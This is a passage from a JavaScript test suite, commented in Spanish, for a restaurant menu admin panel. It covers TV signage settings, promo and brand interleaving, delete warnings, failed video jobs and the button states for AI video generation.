		vm.runInContext('tvProgs = [{ programacion: { activo: true, dias: [], desde: "", hasta: "", desde_fecha: "", hasta_fecha: "" }, modo: "todos" }];', ctx);
		await ctx.saveTV();
		assert.equal(enviado.length, 0, 'no se manda nada hasta arreglarla');
		assert.match(campos.tvStatus.textContent, /1\.ª/);
		assert.match(campos.tvStatus.textContent, /sin días/);
		assert.equal(avisos.at(-1)[0], 'error');
	});

	test('una de «platos sueltos» sin platos tampoco deja guardar', async () => {
		// Esa sí se guardaba, y no enseñaba nada: el aviso de la tarjeta vivía
		// dentro de la rejilla plegada, así que no se veía.
		const { ctx, enviado, campos } = montar();
		vm.runInContext('tvProgs = [{ programacion: { activo: true, dias: [2], desde: "", hasta: "", desde_fecha: "", hasta_fecha: "" }, modo: "manual", productos: [] }];', ctx);
		await ctx.saveTV();
		assert.equal(enviado.length, 0);
		assert.match(campos.tvStatus.textContent, /platos sueltos/);
	});

	test('las que sí sirven no estorban', async () => {
		const { ctx, enviado } = montar();
		vm.runInContext('tvProgs = [{ programacion: { activo: true, dias: [2], desde: "", hasta: "", desde_fecha: "", hasta_fecha: "" }, modo: "todos" }];', ctx);
		await ctx.saveTV();
		assert.equal(enviado.length, 1);
		assert.equal(enviado[0].atributos.tv.programaciones.length, 1);
	});

	test('sin excepciones se guarda una lista vacía, no falta la clave', () => {
		// Si faltara, tv.html caería en su valor por defecto y no habría forma de
		// borrar la última excepción.
		const { ctx, enviado } = montar();
		return ctx.saveTV().then(() => {
			// Con longitud y no con deepEqual: el array nace dentro del vm y una
			// comparación profunda entre realms falla aunque el contenido coincida.
			assert.equal(enviado[0].atributos.tv.programaciones.length, 0);
		});
	});

	test('moverlas cambia el orden, que es lo que decide cuál manda', () => {
		const { ctx } = montar();
		const lista = [{ id: 'a' }, { id: 'b' }, { id: 'c' }];
		ctx.tvMoverProgramacion(2, -1, lista);
		assert.equal(lista.map(x => x.id).join(''), 'acb');
	});

	test('no se puede mover más allá de los extremos', () => {
		const { ctx } = montar();
		const lista = [{ id: 'a' }, { id: 'b' }];
		ctx.tvMoverProgramacion(0, -1, lista);
		ctx.tvMoverProgramacion(1, 1, lista);
		assert.equal(lista.map(x => x.id).join(''), 'ab');
	});

	// ── LOS HORARIOS DE CATEGORÍA, OPCIONALES ─────────────────
	// El televisor y la carta no siempre quieren lo mismo: una categoría de
	// desayunos escondida a las once tiene sentido en el QR y ninguno en una
	// pantalla que enseña lo que el negocio sabe hacer.
	test('por defecto se respetan, aunque no esté guardado', async () => {
		// Una cartelera que lleva meses funcionando no tiene esta clave, y no
		// puede notar que apareció.
		const { ctx, campos, enviado } = montar();
		ctx.renderTV();
		assert.equal(campos.tvRespetarHorarios.checked, true);
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.respetar_horarios, true);
	});

	test('lo guardado se relee, también cuando está apagado', () => {
		const { ctx, campos } = montar({ guardado: { respetar_horarios: false } });
		ctx.renderTV();
		assert.equal(campos.tvRespetarHorarios.checked, false);
	});

	test('apagado se guarda apagado', async () => {
		const { ctx, campos, enviado } = montar({ respetarHorarios: false });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.respetar_horarios, false);
	});

	test('la nota dice lo que pasa en los dos sentidos', () => {
		// Encendido no es "nada": es una regla actuando, configurada en OTRA
		// pestaña, que es justo lo que nadie descubre solo.
		const on = montar();
		on.ctx.tvPintarNotaHorarios();
		assert.match(on.campos.tvNotaHorarios.textContent, /desaparecen de la cartelera/);
		assert.match(on.campos.tvNotaHorarios.textContent, /Categorías/);

		const off = montar({ respetarHorarios: false });
		off.ctx.tvPintarNotaHorarios();
		assert.match(off.campos.tvNotaHorarios.textContent, /todos los platos/);
		// Y que quede claro que no toca la carta del comensal.
		assert.match(off.campos.tvNotaHorarios.textContent, /solo cambia el televisor/);
	});

	test('la lista se guarda en atributos.tv, no como columnas sueltas', async () => {
		// El ritmo y qué se intercala son del TELEVISOR. 'promo_en_tv' sigue
		// siendo columna porque es una propiedad de la promoción, y se deriva de
		// la lista para que no puedan discrepar.
		const { ctx, campos, enviado } = montar({ promoEnTv: true });
		campos.tvCada.value = '3';
		await ctx.saveTV();
		assert.equal(JSON.stringify(enviado[0].atributos.tv.intercalados),
			JSON.stringify([{ tipo: 'promocion' }]));
		assert.equal(enviado[0].atributos.tv.cada, 3);
		assert.equal(enviado[0].promo_en_tv, true);
		// El ritmo dejó de ser de la promoción: ya no se escribe esa columna.
		assert.equal('promo_cada' in enviado[0], false);
	});

	test('la marca se guarda con su logo y su frase', async () => {
		const { ctx, enviado } = montar({ marca: { logo: true, frase: 'Desde 1998' } });
		await ctx.saveTV();
		assert.equal(JSON.stringify(enviado[0].atributos.tv.intercalados),
			JSON.stringify([{ tipo: 'marca', logo: true, frase: 'Desde 1998' }]));
		assert.equal(enviado[0].promo_en_tv, false);
	});

	test('el orden elegido es el orden guardado', async () => {
		const { ctx, enviado } = montar({
			promoEnTv: true, marca: { logo: true, frase: '' }, primero: 'marca',
		});
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.intercalados.map(i => i.tipo).join(' '),
			'marca promocion');
	});

	test('una marca sin logo y sin frase no deja guardar', async () => {
		// Antes esto SÍ se guardaba: la entrada se descartaba en silencio, el
		// interruptor se quedaba encendido y en el televisor no salía nada. Quien
		// lo miraba no tenía forma de saber por qué, y el interruptor encendido
		// decía justo lo contrario de lo que pasaba. Mismo patrón que la
		// cartelera encendida sin platos, que ya se rechazaba.
		const { ctx, campos, enviado } = montar({ promoEnTv: true, marca: { logo: false, frase: '  ' } });
		await ctx.saveTV();
		assert.equal(enviado.length, 0, 'no se manda nada');
		assert.match(campos.tvStatus.textContent, /Incluye tu logo o escribe una frase/);
	});

	test('pero con solo la frase sí', async () => {
		// Quitar el logo y dejar la frase es una configuración legítima, y la
		// cartelera la pinta: la frase sola, más grande.
		const { ctx, enviado } = montar({ marca: { logo: false, frase: 'SABOR AL GUSTO' } });
		await ctx.saveTV();
		assert.equal(JSON.stringify(enviado[0].atributos.tv.intercalados),
			JSON.stringify([{ tipo: 'marca', logo: false, frase: 'SABOR AL GUSTO' }]));
	});

	test('y con solo el logo también', async () => {
		const { ctx, enviado } = montar({ marca: { logo: true, frase: '' } });
		await ctx.saveTV();
		assert.equal(JSON.stringify(enviado[0].atributos.tv.intercalados),
			JSON.stringify([{ tipo: 'marca', logo: true, frase: '' }]));
	});

	test('lo guardado se relee en las casillas', () => {
		const { ctx, campos } = montar({
			guardado: { cada: 6, intercalados: [
				{ tipo: 'marca', logo: true, frase: 'Hola' }, { tipo: 'promocion' }] },
		});
		ctx.renderTV();
		assert.equal(campos.tvIntercalaPromo.checked, true);
		assert.equal(campos.tvIntercalaMarca.checked, true);
		assert.equal(campos.tvMarcaLogo.checked, true);
		assert.equal(campos.tvMarcaFrase.value, 'Hola');
		assert.equal(campos.tvOrdenIntercalados.value, 'marca');
		assert.equal(campos.tvCada.value, '6');
	});

	test('sin lista guardada se arma desde las columnas de siempre', () => {
		// Es lo que hace tv.html, y las dos lecturas tienen que coincidir: si no,
		// el panel enseñaría una cosa y la pared otra.
		const { ctx, campos } = montar({ promo: { promo_en_tv: true, promo_cada: 6 } });
		ctx.renderTV();
		assert.equal(campos.tvIntercalaPromo.checked, true);
		assert.equal(campos.tvIntercalaMarca.checked, false);
		assert.equal(campos.tvCada.value, '6');
	});

	test('un ritmo raro no deja el selector en blanco', () => {
		const { ctx, campos } = montar({ promo: { promo_cada: 97 } });
		ctx.renderTV();
		assert.equal(campos.tvCada.value, '4');
	});

	// Los avisos miran la TABLA de promociones, no las columnas viejas: desde el
	// 05/09/2026 una promoción puede estar marcada para el televisor sin estarlo
	// para la carta, y al revés.
	test('avisa si todavía no hay ninguna promoción', () => {
		const { ctx, campos } = montar({ promoEnTv: true, promociones: [] });
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvPromoAyuda.textContent, /no has creado ningún destacado/);
	});

	test('avisa si ninguna está marcada para el televisor', () => {
		const { ctx, campos } = montar({
			promoEnTv: true,
			promociones: [{ id: 'p1', activa: true, en_tv: false }],
		});
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvPromoAyuda.textContent, /Ninguno de tus destacados/);
	});

	test('avisa si las del televisor están apagadas', () => {
		const { ctx, campos } = montar({
			promoEnTv: true,
			promociones: [{ id: 'p1', activa: false, en_tv: true }],
		});
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvPromoAyuda.textContent, /borrador/);
	});

	test('y con varias dice que se turnan, no que sale "la promoción"', () => {
		// Con cinco promociones, un aviso en singular deja de ser cierto.
		const { ctx, campos } = montar({
			promoEnTv: true,
			promociones: [{ id: 'p1', activa: true, en_tv: true },
			              { id: 'p2', activa: true, en_tv: true }],
		});
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvPromoAyuda.textContent, /2 destacados del televisor se van turnando/);
	});

	test('avisa si se marca el logo sin haberlo subido', () => {
		// La casilla diría que sí y la pantalla saldría sin nada.
		const { ctx, campos } = montar({ marca: { logo: true, frase: '' } });
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvMarcaAyuda.textContent, /no has subido tu logo/);
	});

	test('y si la marca se queda sin logo y sin frase', () => {
		const { ctx, campos } = montar({ marca: { logo: false, frase: '' } });
		ctx.tvAlternarIntercalados();
		assert.match(campos.tvMarcaAyuda.textContent, /Incluye tu logo o escribe una frase/);
	});

	test('elegir el orden solo aparece con dos cosas que ordenar', () => {
		const sola = montar({ promoEnTv: true });
		sola.ctx.tvAlternarIntercalados();
		assert.equal(sola.campos.tvOrdenFila.style.display, 'none');

		const dos = montar({ promoEnTv: true, marca: { logo: true, frase: '' } });
		dos.ctx.tvAlternarIntercalados();
		assert.equal(dos.campos.tvOrdenFila.style.display, 'block');
	});

	// ── LO QUE SE VA A VER, DICHO COMO PASA DE VERDAD ─────────
	// La primera versión dibujaba la secuencia DENTRO de una vuelta y se leía
	// mal en el caso más común: con una sola intercalada por vuelta parecía que
	// la segunda no salía nunca. Sale — en la vuelta siguiente.
	const conSecuencia = (opciones, cuantosPlatos) => {
		const { ctx, campos } = montar(Object.assign({
			promo: { promo_activa: true, promo_imagen_url: 'https://x/p.jpg',
			         logo_url: 'https://x/l.png' },
			productos: Array.from({ length: cuantosPlatos }, (_, i) => ({
				id: 'p' + i, nombre: 'P' + i, disponible: true,
				imagen_url: 'https://x/' + i + '.jpg', categoria_id: 'c1' })),
		}, opciones));
		ctx.renderTV();
		return campos.tvSecuencia.textContent;
	};

	const LAS_DOS = [{ tipo: 'promocion' }, { tipo: 'marca', logo: true, frase: '' }];

	test('con una sola, se dice cada cuánto sale', () => {
		const t = conSecuencia({ guardado: { por_slide: 1, cada: 2,
			intercalados: [{ tipo: 'promocion' }] } }, 4);
		assert.match(t, /Sale tu destacado cada 2 pantallas/);
	});

	test('si caben las dos en una vuelta, se dice que salen las dos', () => {
		const t = conSecuencia({ guardado: { por_slide: 1, cada: 2, intercalados: LAS_DOS } }, 4);
		assert.match(t, /Cada vuelta salen las 2/);
	});

	test('y si solo cabe una, que se van turnando', () => {
		// El caso que se leía mal: 3 pantallas y una cada 2 = un solo hueco.
		const t = conSecuencia({ guardado: { por_slide: 1, cada: 2, intercalados: LAS_DOS } }, 3);
		assert.match(t, /se van turnando/);
		assert.match(t, /esta vuelta tu destacado, la siguiente tu marca/);
	});

	test('si no cabe ninguna no se promete nada', () => {
		// De eso avisa el resumen, y decirlo dos veces con otras palabras confunde.
		const t = conSecuencia({ guardado: { por_slide: 1, cada: 8, intercalados: LAS_DOS } }, 4);
		assert.equal(t, '');
	});

	test('una promoción apagada no cuenta para la secuencia', () => {
		// La cartelera no le da turno, así que prometerlo sería mentir.
		const { ctx, campos } = montar({
			guardado: { por_slide: 1, cada: 2, intercalados: LAS_DOS },
			promo: { promo_activa: false, promo_imagen_url: 'https://x/p.jpg',
			         logo_url: 'https://x/l.png' },
			productos: [1, 2, 3, 4].map(i => ({ id: 'p' + i, nombre: 'P' + i, disponible: true,
				imagen_url: 'https://x/' + i + '.jpg', categoria_id: 'c1' })),
		});
		ctx.renderTV();
		assert.match(campos.tvSecuencia.textContent, /Sale tu marca cada 2/);
	});

	test('encender "Mi marca" enciende el logo', () => {
		// Encenderlo sin nada dentro era un estado muerto: el interruptor decía
		// que sí y no salía ninguna pantalla.
		const { ctx, campos } = montar({ marca: { logo: false, frase: '' } });
		campos.tvIntercalaMarca.checked = true;
		ctx.tvAlternarMarca();
		assert.equal(campos.tvMarcaLogo.checked, true);
	});

	test('pero no lo reenciende cuando ya hay una frase', () => {
		// Quien quiere la frase sola apaga el logo; no se le puede devolver.
		const { ctx, campos } = montar({ marca: { logo: false, frase: 'Desde 1998' } });
		campos.tvIntercalaMarca.checked = true;
		ctx.tvAlternarMarca();
		assert.equal(campos.tvMarcaLogo.checked, false);
	});

	test('ni al apagar "Mi marca"', () => {
		const { ctx, campos } = montar({ marca: { logo: false, frase: '' } });
		campos.tvIntercalaMarca.checked = false;
		ctx.tvAlternarMarca();
		assert.equal(campos.tvMarcaLogo.checked, false);
	});

	test('el resumen cuenta las pantallas intercaladas en la vuelta', () => {
		// Si no se cuentan, el resumen dice que la vuelta dura menos de lo que
		// dura, y el restaurante calcula mal cuánto tarda en repetirse.
		// Por 'guardado' y no por los campos: renderTV los repinta desde lo
		// guardado, así que ponerlos a mano en el DOM no probaría nada.
		const { ctx, campos } = montar({
			guardado: { por_slide: 1, segundos: 10 },
			promo: { promo_en_tv: true, promo_activa: true,
			         promo_imagen_url: 'https://x/p.jpg', promo_cada: 2 },
		});
		ctx.renderTV();
		// 2 platos con foto, de uno en uno = 2 pantallas + 1 intercalada = 30 s
		assert.match(campos.tvResumen.textContent, /\+ 1 intercalada/);
		assert.match(campos.tvResumen.textContent, /30 s/);
	});

	test('avisa si la promoción no llegaría a salir nunca', () => {
		// Ciclo de 2 pantallas con la promo cada 4: no sale jamás, y con la
		// tele puesta parece que se rompió.
		const { ctx, campos } = montar({
			guardado: { por_slide: 1 },
			promo: { promo_en_tv: true, promo_activa: true,
			         promo_imagen_url: 'https://x/p.jpg', promo_cada: 4 },
		});
		ctx.renderTV();
		assert.match(campos.tvResumen.textContent, /no llegaría a salir nunca/);
	});

	test('la categoría no se guarda si el modo no es por categoría', async () => {
		// Dejar el identificador puesto en modo 'todos' es la ambigüedad que
		// tenía el requerimiento original: dos campos diciendo qué mostrar.
		const { ctx, enviado } = montar({ modo: 'todos', categoria: 'c1' });
		await ctx.saveTV();
		assert.equal(enviado[0].atributos.tv.categoria_id, null);
		// .length y no deepEqual con []: el arreglo se construye dentro de la
		// VM, así que su prototipo no es el de aquí y la comparación estricta
		// falla por el prototipo, no por el contenido.
		assert.equal(enviado[0].atributos.tv.productos.length, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('fichaEntornoHtml · la etiqueta de restaurante de prueba', () => {
	// Dos de los nueve son clientes; el resto, demos. La etiqueta es solo eso:
	// no cambia la carta pública, ni los respaldos, ni las estadísticas.
	const { fichaEntornoHtml } = cargar('index.html',
		'function fichaEntornoHtml', 'function estadoPagoHtml');

	test('producción no lleva nada', () => {
		// Son la mayoría de los que importan: llenar la lista de distintivos
		// «Producción» haría que el de «Prueba» dejara de saltar a la vista.
		assert.equal(fichaEntornoHtml({ es_prueba: false }), '');
		assert.equal(fichaEntornoHtml({}), '');
	});

	test('sin fila de facturación tampoco', () => {
		// Siete de los nueve no tienen fila todavía: solo se crea al anotarles
		// un pago o al marcarlos. Sin esto, la lista reventaría al pintarse.
		assert.equal(fichaEntornoHtml(null), '');
		assert.equal(fichaEntornoHtml(undefined), '');
	});

	test('prueba lleva su distintivo', () => {
		const html = fichaEntornoHtml({ es_prueba: true });
		assert.match(html, /esprueba/);
		assert.match(html, /Prueba/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('confirmDelete · borrar una categoría se lleva sus platos', () => {
	// productos.categoria_id es ON DELETE CASCADE: la categoría se lleva por
	// delante todos sus platos, con sus fotos y sus videos. El aviso decía
	// solo "¿seguro que quieres eliminar Entrantes?", y nadie que lea eso
	// espera perder doce platos.
	const borrar = (tipo, id, productos) => {
		const mapa = {
			confirmName:     { textContent: '' },
			confirmArrastre: { textContent: '', style: {} },
		};
		const ctx = cargar('index.html', 'function confirmDelete', 'async function executeDelete', {
			state: { productos, deleteAction: null },
			document: { getElementById: id => mapa[id] },
			openModal() {},
		});
		ctx.confirmDelete(tipo, id, 'Entrantes');
		return mapa.confirmArrastre;
	};

	const P = (id, cat) => ({ id, categoria_id: cat });

	test('avisa de cuántos platos se van con ella', () => {
		const a = borrar('categoria', 'c1', [P('p1','c1'), P('p2','c1'), P('p3','c2')]);
		assert.equal(a.style.display, 'block');
		assert.match(a.textContent, /los 2 platos/);
	});

	test('con un solo plato lo dice en singular', () => {
		// "los 1 platos" es la clase de detalle que hace que un aviso se lea
		// como generado por una máquina y se ignore.
		assert.match(borrar('categoria', 'c1', [P('p1','c1')]).textContent, /el plato que hay dentro/);
	});

	test('una categoría vacía no asusta con nada', () => {
		assert.equal(borrar('categoria', 'c1', [P('p1','c2')]).style.display, 'none');
	});

	test('borrar un producto no arrastra nada', () => {
		assert.equal(borrar('producto', 'p1', [P('p1','c1'), P('p2','c1')]).style.display, 'none');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('etiquetaModelo · todos los modelos tienen nombre', () => {
	// Un modelo listado en PLANES y sin etiqueta salía como "undefined" en el
	// resumen del plan. Pasó con 'video': se añadió a los planes y no a la
	// tabla de etiquetas.
	//
	// Se comprueba que la etiqueta no sea el identificador crudo. Los ids van
	// en minúscula y las etiquetas capitalizadas, así que si coinciden es que
	// no hay etiqueta y está devolviendo el respaldo.
	const ctx = cargar('index.html', 'const TODO_INCLUIDO = {', 'function renderPlanResumen');

	test('ningún modelo de ningún plan se queda sin etiqueta', () => {
		const modelos = new Set();
		for (const n of ['vitrina', 'pedidos', 'completo', 'video'])
			ctx.planDe({ atributos: { plan: n } }).modelos.forEach(m => modelos.add(m));

		assert.ok(modelos.size >= 5, 'deberían salir los cinco modelos');
		for (const m of modelos)
			assert.notEqual(ctx.etiquetaModelo(m), m, `el modelo "${m}" no tiene etiqueta`);
	});

	test('un modelo desconocido no imprime "undefined"', () => {
		// Si algún día hay un modelo nuevo sin etiqueta, que se lea su nombre
		// interno y no una palabra que no significa nada.
		assert.equal(ctx.etiquetaModelo('loquesea'), 'loquesea');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('trabajoFallidoDe · un video que falló tiene que verse', () => {
	// Un trabajo que muere mientras nadie mira la ficha no aparecía en ningún
	// sitio: el plato se quedaba sin video y sin explicación, y volver a
	// subirlo daba exactamente el mismo error.
	const buscar = (trabajos, productoId = 'p1') => {
		const ctx = cargar('index.html', '// Los trabajos de conversión del restaurante.',
			'let vigilanciaVideo = null;', { state: { trabajosVideo: trabajos } });
		return ctx.trabajoFallidoDe(productoId);
	};
	const T = (id, producto_id, estado, creado_en, error = 'algo') =>
		({ id, producto_id, estado, creado_en, error });

	test('encuentra el fallido de ese plato', () => {
		assert.equal(buscar([T('t1', 'p1', 'error', '2026-08-19')]).id, 't1');
	});

	test('no confunde el de otro plato', () => {
		assert.equal(buscar([T('t1', 'p2', 'error', '2026-08-19')]), null);
	});

	test('los que terminaron bien no son un fallo', () => {
		assert.equal(buscar([T('t1', 'p1', 'listo', '2026-08-19')]), null);
	});

	test('uno en marcha todavía no ha fallado', () => {
		// 'pendiente' y 'procesando' no son un error: el worker aún puede
		// sacarlo adelante y avisar de un fallo que no existe asusta en balde.
		assert.equal(buscar([T('t1', 'p1', 'pendiente', '2026-08-19')]), null);
		assert.equal(buscar([T('t2', 'p1', 'procesando', '2026-08-19')]), null);
	});

	test('con varios fallidos manda el más reciente', () => {
		// El motivo del último es el que explica por qué el plato sigue sin
		// video; el de hace tres días puede ser de otro archivo distinto.
		const r = buscar([
			T('viejo', 'p1', 'error', '2026-08-15', 'formato raro'),
			T('nuevo', 'p1', 'error', '2026-08-19', 'dura 1,4 s'),
		]);
		assert.equal(r.id, 'nuevo');
		assert.match(r.error, /1,4 s/);
	});

	test('sin trabajos cargados no revienta', () => {
		const ctx = cargar('index.html', '// Los trabajos de conversión del restaurante.',
			'let vigilanciaVideo = null;', { state: {} });
		assert.equal(ctx.trabajoFallidoDe('p1'), null);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('estilo del carrete · aspecto sin tocar el funcionamiento', () => {
	// Tres aspectos del mismo modelo vertical. No son plantillas distintas:
	// todo lo que los separa es CSS. Aquí se comprueba lo único que decide el
	// panel — cuándo se ofrece la elección y qué se guarda.
	const conModelo = (nav, estiloSelect, estiloGuardado) => {
		const mapa = {
			apEstiloFila: { style: {} },
			apNavModelo:  { value: nav ?? '' },
			apEstilo:     { value: estiloSelect ?? '' },
		};
		const ctx = cargar('index.html', [
			['function navElegido', 'function aplicarPlanAlPanel'],
		], {
			state: { restaurante: { atributos: { nav, estilo: estiloGuardado } } },
			document: { getElementById: id => mapa[id] },
		});
		return { ctx, mapa };
	};

	test('el estilo solo se ofrece en el modelo vertical', () => {
		// Un control que no hace nada es peor que no tenerlo: quien lo usa cree
		// que está trabajando.
		const { ctx, mapa } = conModelo('vertical');
		ctx.ajustarEstiloAlModelo();
		assert.equal(mapa.apEstiloFila.style.display, 'block');
	});

	test('en los demás modelos ni aparece', () => {
		for (const nav of ['topnav', 'sidebar', 'carrito', 'explorar', 'video']) {
			const { ctx, mapa } = conModelo(nav);
			ctx.ajustarEstiloAlModelo();
			assert.equal(mapa.apEstiloFila.style.display, 'none', `en ${nav}`);
		}
	});

	test('sin elegir nada se guarda el clásico', () => {
		const { ctx } = conModelo('vertical', '', undefined);
		assert.equal(ctx.estiloElegido(), 'clasico');
	});

	test('un desplegable vacío conserva lo que ya tenía', () => {
		// Mismo fallo que costó una carta en video: a un <select> se le asigna
		// un valor que no está entre sus opciones y se queda en cadena vacía.
		// Guardar eso le borraría el estilo a un restaurante que no lo tocó.
		const { ctx } = conModelo('vertical', '', 'avance');
		assert.equal(ctx.estiloElegido(), 'avance');
	});

	test('lo elegido manda sobre lo guardado', () => {
		const { ctx } = conModelo('vertical', 'intenso', 'clasico');
		assert.equal(ctx.estiloElegido(), 'intenso');
	});

	test('el estilo se conserva al pasar por otro modelo', () => {
		// Se guarda siempre, también donde no se usa. Si se borrara al cambiar
		// de modelo, quien pruebe otro y vuelva se encontraría su elección
		// perdida sin haberla tocado.
		const { ctx } = conModelo('topnav', '', 'avance');
		assert.equal(ctx.estiloElegido(), 'avance');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('refrescarCupoIA · no puede pisar ni reencender lo que otro apagó', () => {
	// Estas pruebas existen por un fallo que costó dinero de verdad. El
	// 26/08/2026 un mismo plato se generó DOS veces con 21 segundos de
	// diferencia, y las dos causas estaban aquí:
	//
	//   1. Esta función escribía el aviso de proporción en 'iaEstado', el mismo
	//      elemento donde generarConIA acababa de poner "✨ Generando...". Y se
	//      llama justo después, así que el mensaje bueno desaparecía y en su
	//      sitio quedaba un aviso naranja que se lee como un rechazo.
	//   2. Encendía el botón sin mirar, deshaciendo el apagado que generarConIA
	//      acababa de hacer.
	//
	// Juntas: parece que no salió, y el botón invita a volver a pulsar.

	const pantalla = () => {
		const mapa = {};
		for (const id of ['iaCupo', 'btnGenerarIA', 'iaEncaje', 'iaEstado', 'editProductId',
			// El motivo por el que el botón está apagado, y la previa de la foto:
			// desde que el bloque se ve también sin foto, "hay foto" es una de las
			// condiciones y hay que poder simular las dos.
			'iaMotivo', 'imgEditPreview'])
			mapa[id] = { style: {}, textContent: '', value: '', disabled: false };
		mapa.editProductId.value = 'p1';
		// Con foto por defecto: es el estado en el que estas pruebas ya se
		// escribieron, cuando el bloque solo aparecía habiéndola.
		mapa.imgEditPreview.src = 'https://panel/uploads/productos/a.jpg';
		return mapa;
	};

	const correr = (mapa, { cupo = { disponibles: 20, cupo: 24 }, encaje = null,
	                        generandoIA = null, porAprobar = null, enCurso = null,
	                        productos = [] } = {}) => {
		const ctx = cargar('index.html', 'async function refrescarCupoIA()', 'async function generarConIA()', {
			apiFetch: async () => cupo,
			state: { restaurante: { id: 'r1' }, generandoIA, productos },
			document: { getElementById: id => mapa[id] },
			encajeDeLaFotoActual: () => encaje,
			// Vive en otro trozo del archivo; aquí solo importa que no estorbe.
			reintentarEncajeAlCargarLaFoto: () => {},
			videoPorAprobarDe: () => porAprobar,
			trabajoEnCursoDe: () => enCurso,
		});
		return ctx.refrescarCupoIA();
	};

	test('el aviso de proporción NO toca el elemento del estado', async () => {
		// El fallo exacto: generarConIA deja aquí "✨ Generando..." y esta
		// función lo borraba. Tiene que seguir intacto.
		const m = pantalla();
		m.iaEstado.textContent = '✨ Generando... esto tarda un par de minutos.';

		await correr(m, { encaje: { veredicto: 'avisa', mensaje: 'se recortará el 25%' } });

		assert.equal(m.iaEstado.textContent, '✨ Generando... esto tarda un par de minutos.',
			'el estado de la generación no se toca');
		assert.equal(m.iaEncaje.textContent, 'se recortará el 25%', 'el aviso va en su propio sitio');
	});

	test('con una generación en curso el botón NO se vuelve a encender', async () => {
		const m = pantalla();
		m.btnGenerarIA.disabled = true;
		await correr(m, { generandoIA: 'p1' });
		assert.equal(m.btnGenerarIA.disabled, true, 'hay una en camino: pulsar otra vez la paga dos veces');
	});

	test('pero solo para el plato que la está generando', async () => {
		// El cupo es del restaurante; generar para OTRO plato es legítimo.
		const m = pantalla();
		await correr(m, { generandoIA: 'otro-plato' });
		assert.equal(m.btnGenerarIA.disabled, false);
	});

	test('con la conversión en marcha tampoco', async () => {
		// Cubre el hueco de después: la generación terminó, el trabajo existe y
		// todavía se está convirtiendo. Y esto sí sobrevive a recargar.
		const m = pantalla();
		await correr(m, { enCurso: { id: 't1' } });
		assert.equal(m.btnGenerarIA.disabled, true);
	});

	test('con uno esperando revisión se apaga y se dice por qué', async () => {
		// Pedir otra es pagar por una decisión que todavía no se ha tomado.
		const m = pantalla();
		await correr(m, { porAprobar: { id: 't1' } });
		assert.equal(m.btnGenerarIA.disabled, true);
		// El motivo vive en 'iaMotivo' desde que todos los apagados explican
		// por qué: 'iaEncaje' se queda solo para la proporción de la foto, que
		// es lo único que sabe medir.
		assert.match(m.iaMotivo.textContent, /Publícalo o descártalo/);
	});

	// ── UN BOTÓN APAGADO SIN MOTIVO ES UNA FICHA ROTA ─────────
	// El caso que lo destapó: en "Nuevo producto" se sube la foto, aparece el
	// bloque de IA con el botón vivo y hasta el aviso de la proporción — todo
	// invita a pulsar — y al hacerlo contesta que hay que guardar el plato
	// primero. La interfaz ofrecía algo que no se podía hacer.
	//
	// Ahora cada apagado dice qué falta. Ver docs/planesymodelos.md §4.bis.

	test('sin guardar el plato se apaga y lo explica', async () => {
		const m = pantalla();
		m.editProductId.value = '';
		await correr(m);

		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaMotivo.textContent, /Primero guarda el plato/);
	});

	test('sin foto se apaga y lo explica, en vez de esconder el bloque', async () => {
		// Antes esto ocultaba la IA entera. Esconderla deja al usuario sin
		// saber que existe, y quien pagó el plan tiene que verla.
		const m = pantalla();
		m.imgEditPreview.src = '';
		await correr(m);

		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaMotivo.textContent, /Sube una foto/);
	});

	test('la foto marcada para borrar cuenta como que no hay', async () => {
		// La previa sigue en pantalla hasta guardar, pero quien acaba de
		// quitarla no tiene foto: generar la rechazaría el servidor.
		const m = pantalla();
		const ctx = cargar('index.html', 'async function refrescarCupoIA()', 'async function generarConIA()', {
			apiFetch: async () => ({ disponibles: 20, cupo: 24 }),
			state: { restaurante: { id: 'r1' }, pendingImgUrl: '__remove__', productos: [] },
			document: { getElementById: id => m[id] },
			encajeDeLaFotoActual: () => null,
			reintentarEncajeAlCargarLaFoto: () => {},
			videoPorAprobarDe: () => null,
			trabajoEnCursoDe: () => null,
		});
		await ctx.refrescarCupoIA();

		assert.equal(m.btnGenerarIA.disabled, true);
		assert.match(m.iaMotivo.textContent, /Sube una foto/);
	});

	test('sin guardar manda sobre sin foto: es lo primero que falta', async () => {
		// El orden de los motivos importa porque solo se enseña el primero, y
		// decirle "sube una foto" a quien además no ha guardado le manda a
		// hacer algo que tampoco le va a servir todavía.
		const m = pantalla();
		m.editProductId.value = '';
		m.imgEditPreview.src = '';
		await correr(m);

		assert.match(m.iaMotivo.textContent, /Primero guarda el plato/);
	});

	// ── CON VIDEO PUESTO, LA ACCIÓN NO ES LA MISMA ────────────

	test('con un video ya puesto el botón dice "Regenerar"', async () => {
		const m = pantalla();
		await correr(m, { productos: [{ id: 'p1', atributos: { video: { url: 'https://x/v.mp4' } } }] });

		assert.match(m.btnGenerarIA.textContent, /Regenerar/);
		assert.equal(m.btnGenerarIA.disabled, false, 'sigue disponible: no se esconde una función del plan');
	});

	test('y avisa de que no pisa el actual hasta publicarlo', async () => {
		// Es la ventaja del flujo de IA sobre subir un video, y hasta ahora no
		// se contaba en ningún sitio.
		const m = pantalla();
		await correr(m, { productos: [{ id: 'p1', atributos: { video: { url: 'https://x/v.mp4' } } }] });

		assert.match(m.iaMotivo.textContent, /sigue en la carta hasta que revises/);
	});

	test('sin video puesto dice "Generar", no "Regenerar"', async () => {
		const m = pantalla();
		await correr(m, { productos: [{ id: 'p1', atributos: {} }] });

		assert.match(m.btnGenerarIA.textContent, /Generar video con IA/);
		assert.doesNotMatch(m.btnGenerarIA.textContent, /Regenerar/);
	});

	test('un archivo elegido y sin subir NO es un video puesto', async () => {
		// Se mira el dato guardado, no la pantalla. Llamarlo "Regenerar" antes
		// de que exista nada sería mentir sobre el estado del plato.
		const m = pantalla();
